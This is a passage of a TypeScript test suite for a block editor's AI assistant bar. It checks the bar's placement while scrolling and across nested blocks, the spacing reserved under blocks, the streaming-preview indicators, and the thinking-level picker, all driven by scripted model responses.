      expect(scrollBy).not.toHaveBeenCalled();
    });

    it('stays at the window\'s bottom edge when its block moves below the window', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      vi.spyOn(window, 'innerHeight', 'get').mockReturnValue(250);
      vi.spyOn(window, 'scrollBy').mockImplementation(() => undefined);
      select('p1', 0, 'p1', 0);
      pressModJ(inputOf('p1'));
      expect(barStyle().top).toBe('130px');

      // Text written above it pushes its block down.
      pageShift.y = 300;
      document.dispatchEvent(new Event('scroll'));
      await settle(50);

      // 16px above the window's bottom: 250 - 16 - 46.
      expect(barStyle().top).toBe('188px');
      // The gap stays under its block, so it comes back there.
      pageShift.y = 0;
      document.dispatchEvent(new Event('scroll'));
      await settle(50);
      expect(barStyle().top).toBe('130px');
    });

    it('stays at the window\'s top edge when its block is scrolled above the window', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      select('p1', 0, 'p1', 0);
      pressModJ(inputOf('p1'));

      pageShift.y = -400;
      document.dispatchEvent(new Event('scroll'));
      await settle(50);

      expect(barStyle().top).toBe('16px');
    });

    const NESTING_TOOLS = { paragraph: Paragraph, column_list: ColumnList, column: Column, toggle: ToggleItem };

    /** Two columns at the same height, side by side. */
    const sideBySide = (top: number): Record<string, DOMRect> => ({
      c1: new DOMRect(100, top, 290, 60),
      c2: new DOMRect(410, top, 290, 60),
    });

    it('a caret in a toggle child: the bar sits under the child', async () => {
      await createEditor(scripted(), undefined, {
        tools: NESTING_TOOLS,
        data: {
          blocks: [
            { id: 'p1', type: 'paragraph', data: { text: 'Hello' } },
            { id: 'tg', type: 'toggle', data: { text: 'Toggle', isOpen: true }, content: ['k'] },
            { id: 'k', type: 'paragraph', data: { text: 'Inside' }, parent: 'tg' },
            { id: 'p3', type: 'paragraph', data: { text: 'Third' } },
          ],
        },
      });
      fakeLayout();

      expect(holderOf('k').parentElement?.closest('[data-blok-id="tg"]')).not.toBeNull();
      select('k', 1, 'k', 1);
      pressModJ(inputOf('k'));

      // Holders in document order: p1, tg, k (top 300), p3. A stacked container opens space under the child.
      expect(gapped()).toEqual(['k']);
      expect(barStyle().top).toBe('330px');
    });

    it('a caret in a column: the bar sits under the column list', async () => {
      await createEditor(scripted(), undefined, {
        tools: NESTING_TOOLS,
        data: {
          blocks: [
            { id: 'p1', type: 'paragraph', data: { text: 'Hello' } },
            { id: 'cl', type: 'column_list', data: {}, content: ['c1', 'c2'] },
            { id: 'c1', type: 'column', data: {}, parent: 'cl', content: ['left'] },
            { id: 'left', type: 'paragraph', data: { text: 'Left' }, parent: 'c1' },
            { id: 'c2', type: 'column', data: {}, parent: 'cl', content: ['right'] },
            { id: 'right', type: 'paragraph', data: { text: 'Right' }, parent: 'c2' },
            { id: 'p3', type: 'paragraph', data: { text: 'Third' } },
          ],
        },
      });
      fakeLayout(sideBySide(200));

      expect(holderOf('right').parentElement?.closest('[data-blok-id="cl"]')).not.toBeNull();
      select('right', 1, 'right', 1);
      pressModJ(inputOf('right'));

      // The list is the second holder (top 200): a gap on a column would leave the other column under the bar.
      expect(gapped()).toEqual(['cl']);
      expect(barStyle().top).toBe('230px');
    });

    it('a caret in a column inside a toggle: the bar sits under the column list, not the toggle', async () => {
      await createEditor(scripted(), undefined, {
        tools: NESTING_TOOLS,
        data: {
          blocks: [
            { id: 'p1', type: 'paragraph', data: { text: 'Hello' } },
            { id: 'tg', type: 'toggle', data: { text: 'Toggle', isOpen: true }, content: ['cl'] },
            { id: 'cl', type: 'column_list', data: {}, parent: 'tg', content: ['c1', 'c2'] },
            { id: 'c1', type: 'column', data: {}, parent: 'cl', content: ['left'] },
            { id: 'left', type: 'paragraph', data: { text: 'Left' }, parent: 'c1' },
            { id: 'c2', type: 'column', data: {}, parent: 'cl', content: ['right'] },
            { id: 'right', type: 'paragraph', data: { text: 'Right' }, parent: 'c2' },
            { id: 'p3', type: 'paragraph', data: { text: 'Third' } },
          ],
        },
      });
      fakeLayout(sideBySide(300));

      expect(holderOf('cl').parentElement?.closest('[data-blok-id="tg"]')).not.toBeNull();
      select('right', 1, 'right', 1);
      pressModJ(inputOf('right'));

      // Holders: p1, tg, cl (top 300), ...
      expect(gapped()).toEqual(['cl']);
      expect(barStyle().top).toBe('330px');
    });

    it('keeps its block when the block re-renders under the same id', async () => {
      const editor = await createEditor(scripted(), undefined, THREE_BLOCKS);

      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));

      const before = holderOf('p2');

      await editor.blocks.update('p2', { text: 'Changed' });

      expect(holderOf('p2')).not.toBe(before);
      await waitFor(() => expect(gapped()).toEqual(['p2']));
      expect(barStyle().top).toBe('230px');
    });

    it('stays inside the page width, not the window width with its scrollbar', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      vi.spyOn(document.documentElement, 'clientWidth', 'get').mockReturnValue(400);

      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));

      // 400 minus 16px a side.
      expect(barStyle().width).toBe('368px');
      expect(barStyle().left).toBe('16px');
    });

    it('a new run that only answers shows no slots after a run that streamed', async () => {
      const gate = { open: (): void => undefined };
      const opened = new Promise<void>((resolve) => {
        gate.open = resolve;
      });
      const calls = { count: 0 };

      await createEditor(async (request) => {
        calls.count += 1;
        if (calls.count === 1) {
          request.onStream?.({ type: 'tool_start', index: 0, id: 'r0', name: 'blok_read' });

          return answer('First.');
        }
        await opened;

        return answer('Second.');
      });
      pressModJ(paragraphInput());
      submit('One');
      await waitFor(() => expect(within(bar()).getByText('First.')).toBeVisible());
      within(bar()).getByRole('textbox').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));
      expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull();

      pressModJ(paragraphInput());
      submit('Two');
      await settle();

      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
      gate.open();
      await waitFor(() => expect(within(bar()).getByText('Second.')).toBeVisible());
    });

    it('re-places once per frame when the page scrolls, not once per event', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));
      expect(barStyle().top).toBe('230px');

      const writes = { count: 0 };
      const observer = new MutationObserver(() => {
        writes.count += 1;
      });

      observer.observe(bar(), { attributes: true, attributeFilter: ['style'] });
      pageShift.y = -50;
      Array.from({ length: 5 }).forEach(() => document.dispatchEvent(new Event('scroll')));

      // Nothing yet: the frame has not come.
      expect(barStyle().top).toBe('230px');
      await waitFor(() => expect(barStyle().top).toBe('180px'));
      await settle(50);
      observer.disconnect();
      expect(writes.count).toBe(1);
    });

    it('a hidden sibling does not make a block share its row, even when the block starts above the window', async () => {
      await createEditor(scripted(), undefined, {
        tools: { paragraph: Paragraph, column_list: ColumnList, column: Column },
        data: {
          blocks: [
            { id: 'cl', type: 'column_list', data: {}, content: ['c1', 'c2'] },
            { id: 'c1', type: 'column', data: {}, parent: 'cl', content: ['left'] },
            { id: 'left', type: 'paragraph', data: { text: 'Left' }, parent: 'c1' },
            { id: 'c2', type: 'column', data: {}, parent: 'cl', content: ['right'] },
            { id: 'right', type: 'paragraph', data: { text: 'Right' }, parent: 'c2' },
          ],
        },
      });
      // c1 is hidden (display:none: an all-zero rect); c2 straddles the window's top.
      fakeLayout({ c1: new DOMRect(0, 0, 0, 0), c2: new DOMRect(410, -20, 290, 60) });
      select('right', 1, 'right', 1);
      pressModJ(inputOf('right'));

      expect(gapped()).toEqual(['right']);
    });

    it('scrolls the bar into view at once under reduced motion', async () => {
      vi.stubGlobal('matchMedia', (query: string) => ({
        matches: query.includes('reduce'),
        media: query,
        onchange: null,
        addListener: vi.fn(),
        removeListener: vi.fn(),
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
        dispatchEvent: () => false,
      }));
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      vi.spyOn(window, 'innerHeight', 'get').mockReturnValue(250);
      const scrollBy = vi.spyOn(window, 'scrollBy').mockImplementation(() => undefined);

      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));

      expect(scrollBy).toHaveBeenCalledWith({ top: 276 - 250 + 16, behavior: 'instant' });
    });

    it.each(['close', 'destroy'] as const)('%s cancels a re-place frame still pending', async (end) => {
      const editor = await createEditor(scripted(), undefined, THREE_BLOCKS);

      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));

      // Frames never come by themselves here: only a cancel can drop this one.
      vi.stubGlobal('requestAnimationFrame', () => 4242);
      const cancel = vi.fn();

      vi.stubGlobal('cancelAnimationFrame', cancel);
      document.dispatchEvent(new Event('scroll'));
      if (end === 'close') {
        within(bar()).getByRole('textbox').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));
      } else {
        editors.splice(editors.indexOf(editor), 1);
        editor.destroy();
      }

      expect(cancel).toHaveBeenCalledWith(4242);
    });

    it('close releases the gap', async () => {
      await createEditor(scripted(), undefined, THREE_BLOCKS);
      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));
      expect(gapped()).toEqual(['p2']);

      within(bar()).getByRole('textbox').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true, cancelable: true }));

      expect(screen.queryByRole('dialog', { name: 'Ask AI' })).toBeNull();
      expect(gapped()).toEqual([]);
      expect(gapOf('p2')).toBe('');
    });

    it('an insert with no position yet previews under the bar, and the bar moves under space held ahead of it', async () => {
      const live = streaming();

      await createEditor(live.model, undefined, THREE_BLOCKS);
      fakeLayout();
      // The context names p1; the bar sits under p2, where the selection ends.
      select('p1', 1, 'p2', 3);
      pressModJ(inputOf('p2'));
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: '{"commands":[{"name":"block.insert","args":{"type":"paragraph","data":{"text":"Under the bar' });

      await waitFor(() => expect(previewText()).toBe('Under the'));
      expect(gapped()).toEqual(['p2']);
      expect(gapOf('p2')).toBe(`${BAR_GAP + PREVIEW_HEIGHT}px`);
      expect(barStyle().top).toBe('230px');

      // A rewrite of p2 holds its extra height nearest the holder, ahead of the bar
      // (live-preview.ts RewriteBox; jsdom finds no block inputs to draw one here).
      reserveGap(holderOf('p2'), 'rewrite:test', 16, 'end', true);

      expect(barStyle().top).toBe('246px');
      expect(gapOf('p2')).toBe(`${16 + BAR_GAP + PREVIEW_HEIGHT}px`);

      releaseGap(holderOf('p2'), 'rewrite:test');

      expect(barStyle().top).toBe('230px');
      live.finish(answer('Done.'));
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      // The answer cleared the preview, so the bar is back under its block.
      expect(gapOf('p2')).toBe(`${BAR_GAP}px`);
      expect(barStyle().top).toBe('230px');
    });

    it('a question answered in text never shows the slots', async () => {
      const { model, release } = gated(answer('Knead the dough longer.'));

      await createEditor(model, undefined, THREE_BLOCKS);
      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));
      submit('How do I make a good pizza?');
      await settle();

      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
      expect(gapOf('p2')).toBe(`${BAR_GAP}px`);

      release();
      await waitFor(() => expect(within(bar()).getByText('Knead the dough longer.')).toBeVisible());
      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
    });

    it('a model that does not stream shows no slots before its first edit', async () => {
      const { model, release } = gated(insertBatch('From AI'));
      const calls = { count: 0 };
      const editor = await createEditor(
        async (request) => (calls.count++ === 0 ? model(request) : answer('Done.')),
        undefined,
        THREE_BLOCKS
      );

      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));
      submit('Write');
      await settle();

      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
      expect(gapOf('p2')).toBe(`${BAR_GAP}px`);

      release();
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
      expect(gapOf('p2')).toBe(`${BAR_GAP}px`);
      expect(await texts(editor)).toEqual(['Hello', 'Second', 'Third', 'From AI']);
    });

    it('a model that does not stream drops the slots once its edit lands, while it still works', async () => {
      const { model, release } = gated(answer('Done.'));
      const calls = { count: 0 };
      const editor = await createEditor(
        async (request) => (calls.count++ === 0 ? insertBatch('From AI') : model(request)),
        undefined,
        THREE_BLOCKS
      );

      fakeLayout();
      select('p2', 0, 'p2', 0);
      pressModJ(inputOf('p2'));
      submit('Write');

      await waitFor(async () => expect(await texts(editor)).toEqual(['Hello', 'Second', 'Third', 'From AI']));
      await waitFor(() => expect(calls.count).toBe(2));
      await settle();

      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
      expect(gapped()).toEqual(['p2']);
      expect(gapOf('p2')).toBe(`${BAR_GAP}px`);

      release();
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
    });

    describe('a streamed edit the preview has not drawn', () => {
      const writeAfterP2 = (id: string, text: string): { json: string } =>
        executeCall(id, [{ name: 'block.insert', args: { type: 'paragraph', data: { text }, position: { after: 'p2' } } }]);

      const slotsShown = (): boolean => bar().querySelector('[data-blok-assistant-slots]:not([hidden])') !== null;

      const holderWithText = (text: string): HTMLElement => {
        const holder = [...document.querySelectorAll<HTMLElement>('[data-blok-element]')].find((el) => el.textContent === text);

        if (holder === undefined) {
          throw new Error(`no holder with ${text}`);
        }

        return holder;
      };

      const open = async (extra: Partial<BlokConfig> = {}): Promise<ReturnType<typeof liveRuns>> => {
        const runs = liveRuns();

        await createEditor(runs.model, undefined, { ...THREE_BLOCKS, ...extra });
        fakeLayout();
        select('p2', 0, 'p2', 0);
        pressModJ(inputOf('p2'));
        submit('Write');
        await waitFor(() => expect(runs.calls).toHaveLength(1));
        // The preview never draws, as when a call arrives whole: only the bar's slots show.
        vi.stubGlobal('requestAnimationFrame', () => 0);

        return runs;
      };

      it('drops the slots once it lands, and the next edit shows them under what it wrote', async () => {
        const runs = await open();
        const emit = (event: AgentModelStreamEvent): void => runs.calls[0].request.onStream?.(event);
        const first = writeAfterP2('c1', 'Table here');

        emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
        await settle();
        expect(slotsShown()).toBe(true);
        expect(gapOf('p2')).toBe(`${BAR_GAP + SLOTS_HEIGHT}px`);

        emit({ type: 'tool_input', index: 0, json: first.json });
        emit({ type: 'tool_end', index: 0 });
        await waitFor(() => expect(holderWithText('Table here')).toBeTruthy());
        await settle();

        const written = holderWithText('Table here');

        expect(slotsShown()).toBe(false);
        expect(gapped()).toEqual([written.getAttribute('data-blok-id')]);
        expect(startGap(written)).toBe(`${BAR_GAP}px`);

        emit({ type: 'tool_start', index: 1, id: 'c2', name: 'blok_execute' });
        await settle();

        expect(slotsShown()).toBe(true);
        expect(startGap(written)).toBe(`${BAR_GAP}px`);
        expect(written.style.getPropertyValue('--blok-ai-gap')).toBe(`${SLOTS_HEIGHT}px`);
      });

      it('keeps the slots, moved under what it wrote, when the next edit already started', async () => {
        const runs = await open();
        const emit = (event: AgentModelStreamEvent): void => runs.calls[0].request.onStream?.(event);
        const first = writeAfterP2('c1', 'Table here');

        emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
        emit({ type: 'tool_input', index: 0, json: first.json });
        emit({ type: 'tool_start', index: 1, id: 'c2', name: 'blok_execute' });
        emit({ type: 'tool_end', index: 0 });
        await waitFor(() => expect(holderWithText('Table here')).toBeTruthy());
        await settle();

        expect(slotsShown()).toBe(true);
        expect(startGap(holderWithText('Table here'))).toBe(`${BAR_GAP}px`);
        expect(holderWithText('Table here').style.getPropertyValue('--blok-ai-gap')).toBe(`${SLOTS_HEIGHT}px`);
      });

      it('puts the slots under a written table, not inside one of its cells', async () => {
        const runs = await open({ tools: { paragraph: Paragraph, table: Table } });
        const emit = (event: AgentModelStreamEvent): void => runs.calls[0].request.onStream?.(event);
        const markdown = '| Year | Event |\n| --- | --- |\n| 2006 | Books |\n| 2011 | Pizza |';
        const { json } = executeCall('c1', [{ name: 'markdown.insert', args: { markdown, position: { after: 'p2' } } }]);

        emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
        emit({ type: 'tool_input', index: 0, json });
        emit({ type: 'tool_start', index: 1, id: 'c2', name: 'blok_execute' });
        emit({ type: 'tool_end', index: 0 });

        const table = (): HTMLElement | null => document.querySelector<HTMLElement>('[data-blok-component="table"]');

        await waitFor(() => expect(table()?.textContent).toContain('Pizza'));
        await settle();

        expect(slotsShown()).toBe(true);
        expect(table()?.style.getPropertyValue('--blok-ai-gap')).toBe(`${SLOTS_HEIGHT}px`);
        // The bar over the table, the slots under it: one holder holds both.
        expect(startGap(table()?.closest('[data-blok-element]') ?? null)).toBe(`${BAR_GAP}px`);
        expect(gapped()).toHaveLength(1);
      });

      it('leaves no gap under what it wrote once the run ends', async () => {
        const runs = await open();
        const emit = (event: AgentModelStreamEvent): void => runs.calls[0].request.onStream?.(event);
        const first = writeAfterP2('c1', 'Table here');

        emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
        emit({ type: 'tool_input', index: 0, json: first.json });
        emit({ type: 'tool_start', index: 1, id: 'c2', name: 'blok_execute' });
        emit({ type: 'tool_end', index: 0 });
        await waitFor(() => expect(holderWithText('Table here')).toBeTruthy());
        runs.calls[0].finish(answer('Done.'));
        await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());

        expect(slotsShown()).toBe(false);
        expect(gapped()).toEqual([holderWithText('Table here').getAttribute('data-blok-id')]);
        expect(holderWithText('Table here').getAttribute('data-blok-ai-gap')).toBe('start');
      });
    });

    it('a streaming model keeps the slots until the preview draws its first write', async () => {
      const live = streaming();
      const call = executeCall('c1', [{ name: 'block.insert', args: { type: 'paragraph', position: 'end', data: { text: 'Fresh words here' } } }]);

      await createEditor(live.model);
      fakeLayout();
      pressModJ(paragraphInput());
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      // A read streams too, but draws nothing: the slots stay.
      live.emit({ type: 'tool_start', index: 0, id: 'r1', name: 'blok_read' });
      live.emit({ type: 'tool_input', index: 0, json: '{"ids":["p1"]}' });
      live.emit({ type: 'tool_end', index: 0 });
      live.emit({ type: 'tool_start', index: 1, id: 'c1', name: 'blok_execute' });
      await settle(50);
      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).not.toBeNull();

      live.emit({ type: 'tool_input', index: 1, json: call.json.slice(0, call.json.indexOf('here')) });
      await waitFor(() => expect(previewText()).toBe('Fresh words'));
      await waitFor(() => expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull());
      live.finish(answer('Done.'));
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    it('a streaming model does not bring the slots back for a second edit after the first drew', async () => {
      const live = streaming();
      const first = executeCall('c1', [{ name: 'block.insert', args: { type: 'paragraph', position: 'end', data: { text: 'Fresh words here' } } }]);

      await createEditor(live.model);
      fakeLayout();
      pressModJ(paragraphInput());
      submit('Write');
      await waitFor(() => expect(live.started()).toBe(true));

      live.emit({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      live.emit({ type: 'tool_input', index: 0, json: first.json.slice(0, first.json.indexOf('here')) });
      await waitFor(() => expect(previewText()).toBe('Fresh words'));
      await waitFor(() => expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull());

      live.emit({ type: 'tool_start', index: 1, id: 'c2', name: 'blok_execute' });
      await settle(50);

      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
      live.finish(answer('Done.'));
      await waitFor(() => expect(within(bar()).getByText('Done.')).toBeVisible());
    });

    it('a follow-up on a streaming model shows the slots again once it starts an edit', async () => {
      const runs = liveRuns();
      const editor = await createEditor(runs.model);

      fakeLayout();
      editor.agent.openAssistant();
      submit('One');
      await waitFor(() => expect(runs.calls).toHaveLength(1));
      runs.calls[0].request.onStream?.({ type: 'tool_start', index: 0, id: 'r1', name: 'blok_read' });
      runs.calls[0].finish(answer('First.'));
      await waitFor(() => expect(within(bar()).getByText('First.')).toBeVisible());

      submit('Two');
      await waitFor(() => expect(runs.calls).toHaveLength(2));

      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).toBeNull();
      runs.calls[1].request.onStream?.({ type: 'tool_start', index: 0, id: 'c1', name: 'blok_execute' });
      await settle();
      expect(bar().querySelector('[data-blok-assistant-slots]:not([hidden])')).not.toBeNull();
      runs.calls[1].finish(answer('Second.'));
      await waitFor(() => expect(within(bar()).getByText('Second.')).toBeVisible());
    });
  });

  describe('thinking level', () => {
    const thinkingButton = (): HTMLElement | null => within(bar()).queryByRole('button', { name: /^Thinking/ });

    it('names the current level on the button, and sends the picked level from the next prompt', async () => {
      const model = scripted(answer('First answer'), answer('Second answer'));
      const editor = await createEditor(model, { levels: ['low', 'high'], default: 'low' });

      editor.agent.openAssistant();

      const button = within(bar()).getByRole('button', { name: 'Thinking: Low' });

      submit('One');
      await waitFor(() => expect(within(bar()).getByText('First answer')).toBeVisible());

      button.click();
      screen.getByRole('menuitemradio', { name: 'High' }).click();
      await settle();

      expect(button).toHaveAccessibleName('Thinking: High');

      submit('Two');
      await waitFor(() => expect(within(bar()).getByText('Second answer')).toBeVisible());
      expect(model.requests.map((request) => request.thinking)).toEqual(['low', 'high']);
    });

    it('reports the level menu as collapsed before it is ever opened', async () => {
      const editor = await createEditor(scripted(), { levels: ['low', 'high'] });

      editor.agent.openAssistant();

      expect(within(bar()).getByRole('button', { name: 'Thinking: Low' })).toHaveAttribute('aria-expanded', 'false');
    });

    it('hides the picker when the host offers one level', async () => {
      const editor = await createEditor(scripted(), { levels: ['high'] });

      editor.agent.openAssistant();

      expect(thinkingButton()).toBeNull();
    });

    it('hides the picker, and still opens the bar, when the thinking config is invalid', async () => {
      const editor = await createEditor(scripted(), { levels: [] });

      editor.agent.openAssistant();

      expect(bar()).toBeVisible();
      expect(thinkingButton()).toBeNull();
    });
  });
});
